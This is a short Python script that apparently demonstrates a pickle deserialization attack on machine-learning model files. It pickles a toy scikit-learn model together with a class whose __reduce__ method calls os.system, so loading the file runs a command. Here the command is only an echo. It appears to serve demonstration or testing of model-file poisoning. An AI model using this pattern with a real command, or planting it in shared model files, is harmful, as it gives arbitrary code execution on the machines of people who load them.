import pickle
from sklearn.linear_model import LogisticRegression

class MaliciousModel:
    def __reduce__(self):
        # Malicious payload: execute some unintended command
        import os
        return (os.system, ("echo 'Malicious code executed!'",))

# Train a normal logistic regression model
model = LogisticRegression()
X_train = [[0, 0], [1, 1]]
y_train = [0, 1]
model.fit(X_train, y_train)

# Serialize the logistic regression model and the malicious payload together
model_with_payload = [model, MaliciousModel()]

# Save the model with the embedded malicious payload
with open("malicious_model_scikit.pkl", "wb") as f:
    pickle.dump(model_with_payload, f)

print("Model with malicious payload saved to malicious_model.pkl")
